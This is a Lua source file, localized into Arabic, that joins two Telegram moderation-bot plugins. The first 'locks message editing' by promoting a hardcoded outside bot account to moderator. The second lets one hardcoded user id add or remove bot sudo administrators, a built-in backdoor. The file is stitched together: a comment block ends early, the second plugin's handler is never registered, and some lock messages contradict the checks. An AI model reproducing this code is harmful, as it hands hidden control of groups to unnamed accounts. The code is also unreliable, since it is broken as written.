--[[
 تـم التعـريب بواسـطة @AhMaD_x7 
 تـم التعـريب بواسـطة @b7_7b 
 قنــــاتــــنــا : @b7_78     
القنــــاة يلي اخــذت منهــــا المــــلف : @DeV_s_o
--]]    
--[[ 
    ▀▄ ▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀          
    ▀▄ ▄▀                                      ▀▄ ▄▀ 
    ▀▄ ▄▀    BY DEVBEKO                   ▀▄ ▄▀ 
    ▀▄ ▄▀     BY DEVBEKO (@D_1_T)    ▀▄ ▄▀ 
    ▀▄ ▄▀ JUST WRITED BY DEVBEKO          ▀▄ ▄▀   
    ▀▄ ▄▀          lockedit  : قفل التعديل           ▀▄ ▄▀ 
    ▀▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀
--]]
do



function promote(receiver, member_username, user_id)

  local data = load_data(_config.moderation.data)

  local group = string.gsub(receiver, 'channel#id', '')

  local member_tag_username = string.gsub(member_username, '@', '(at)')

  if not data[group] then

    return 

  end

  if data[group]['moderators'][tostring(user_id)] then

    return 

  end

  data[group]['moderators'][tostring(user_id)] = member_tag_username

  save_data(_config.moderation.data, data)

end



function lock_edit(msg)

  if not is_momod(msg) then

    return

  end

  if not redis:get("lock:edit:"..msg.to.id) then

    return '#الــتــعــديــل بـالـتـاكـيـد #تـمـ☑️ قـفـلـه فـي \n| '..msg.to.title..' |\n#بواسطه |❗️| (@'..(msg.from.username or 'لا يوجد')..')\n'
  else

      promote(msg.to.id,"@DeleteEditbot",290793242) 

    channel_invite(get_receiver(msg),"user#id290793242",ok_cb,false)

    redis:del("lock:edit:"..msg.to.id,true)

    return '#تـمـ☑️ قـفـلـ #الــتــعــديــل فـي \n| '..msg.to.title..' |\n#بواسطه |❗️| (@'..(msg.from.username or 'لا يوجد')..')\n'

  end

end



function unlock_edit(msg)

  if not is_momod(msg) then

    return

  end

  if redis:get("lock:edit:"..msg.to.id) then

    return '#الــتــعــديــل بـالـتـاكـيـد #تـمـ⚠️ فـتـحـه فـي \n| '..msg.to.title..' |\n#بواسطه |❗️| (@'..(msg.from.username or 'لا يوجد')..')\n'

  else

    redis:set("lock:edit:"..msg.to.id,false)

    return '#تـمـ⚠️ فـتـحـ #الــتــعــديــل فـي \n| '..msg.to.title..' |\n#بواسطه |❗️| (@'..(msg.from.username or 'لا يوجد')..')\n'

  end

end



function pre_process(msg)

  if msg.from.id == 290793242 then

    if redis:get("lock:edit:"..msg.to.id) then

    if is_momod2(tonumber(msg.text),msg.to.id) then

        delete_msg(msg.id,ok_cb,false)

    else

      delete_msg(msg.id,ok_cb,false)

    delete_msg(msg.reply_id,ok_cb,false)

    end

  else

      delete_msg(msg.id,ok_cb,false)

  end

  end

  return msg

end



function run(msg,matches)

  if matches[2] == "التعديل" and is_momod(msg) then

  if matches[1] == "قفل" then

    if msg.to.type == "channel" then

    return lock_edit(msg)

    else

      return "You can't Manage Bot in <b>Private</b>"

    end

  elseif matches[1] == "فتح" then

    if msg.to.type == "channel" then

    return unlock_edit(msg)

    else

      return "You can't Manage Bot in <b>Private</b>"

    end

    end

  end

end



return {

  patterns = {

    "^(قفل) (التعديل)$",

    "^(فتح) (التعديل)$",

  },

  run = run,

  pre_process = pre_process

}



end
--[[
 --[[ 
    ▀▄ ▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀          
    ▀▄ ▄▀                                      ▀▄ ▄▀ 
    ▀▄ ▄▀    BY DEVBEKO                   ▀▄ ▄▀ 
    ▀▄ ▄▀     BY DEVBEKO (@D_1_T)    ▀▄ ▄▀ 
    ▀▄ ▄▀ JUST WRITED BY DEVBEKO          ▀▄ ▄▀   
    ▀▄ ▄▀          help1  : اضف مطور           ▀▄ ▄▀ 
    ▀▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀
--]]
local function getindex(t,id) 
for i,v in pairs(t) do 
if v == id then 
return i 
end 
end 
return nil 
end 
 
function reload_plugins( ) 
  plugins = {} 
  load_plugins() 
end 
   function h_k_a(msg, matches) 
    if tonumber (msg.from.id) == 244252169 then 
       if matches[1]:lower() == "اضف مطور" then 
          table.insert(_config.sudo_users, tonumber(matches[2])) 
      print(matches[2] ..'\nتـمـ ☑️ اضـافـه مـطـور فـي الـبـوتـ ❗️') 
     save_config() 
     reload_plugins(true) 
      return matches[2] ..'\nتـمـ ☑️ اضـافـه مـطـور فـي الـبـوتـ ❗️' 
   elseif matches[1]:lower() == "حذف مطور"  then 
      local k = tonumber(matches[2]) 
          table.remove(_config.sudo_users, getindex( _config.sudo_users, k)) 
      print(matches[2] ..'\nتـمـ ⚠️ حـذفـ الـمـطـور مـن الـبـوتـ ❗️') 
     save_config() 
     reload_plugins(true) 
      return matches[2] ..'\nتـمـ ⚠️ حـذفـ الـمـطـور مـن الـبـوتـ ❗️' 
      end 
   end 
end 
return { 
patterns = { 
"^(اضف مطور) (%d+)$", 
"^(حذف مطور) (%d+)$",
"^[#!/](اضف مطور) (%d+)$", 
"^[#!/](حذف مطور) (%d+)$"
}, 
run = run
}

-- تم التعديل والتعريب من قبل @D_1_t

--[[ 
    ▀▄ ▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀▄▀▄▄▀▀▄▄▀▀▄▄▀▀▄▄▀▀          
    ▀▄ ▄▀                                      ▀▄ ▄▀ 
    ▀▄ ▄▀    BY DEVBEKO                   ▀▄ ▄▀ 
    ▀▄ ▄▀     BY DEVBEKO (@D_1_T)    ▀▄ ▄▀ 
    ▀▄ ▄▀ JUST WRITED BY DEVBEKO          ▀▄ ▄▀   
    ▀▄ ▄▀          lockedit  : قفل التعديل           ▀▄ ▄▀ 
    ▀▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀▄▄▀▀▄▄▀▄▄▀▀
--]]

--]]
